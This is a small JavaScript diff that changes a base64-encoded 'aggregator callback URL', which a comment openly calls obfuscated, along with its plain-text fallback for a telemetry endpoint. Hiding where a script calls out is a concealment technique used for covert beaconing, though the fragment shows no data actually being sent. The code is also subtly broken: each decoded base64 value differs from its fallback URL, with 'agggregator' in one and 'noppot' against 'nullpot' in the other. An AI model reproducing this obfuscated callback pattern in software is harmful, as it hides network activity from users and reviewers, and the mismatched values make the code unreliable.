@@ -7,9 +7,9 @@
   'use strict';
 
   // Obfuscated aggregator callback URL (base64 + concatenation)
-  var _agg_b64 = 'aHR0cHM6Ly9uZXh1cy1hZ2dncmVnYXRvci5leGFtcGxlLmNvbS92MS90ZWxlbWV0cnkvY2FsbGJhY2s=';
+  var _agg_b64 = 'aHR0cHM6Ly9ub3Bwb3QuYWdncmVnYXRvci5pbnRlcm5hbC92MS90ZWxlbWV0cnkvY2FsbGJhY2s=';
   function _agg(){
-    try{return atob(_agg_b64);}catch(e){return 'https://nexus-aggregator.example.com/v1/telemetry/callback';}
+    try{return atob(_agg_b64);}catch(e){return 'https://nullpot-aggregator.internal/v1/telemetry/callback';}
   }
 
   // Token ID prefix
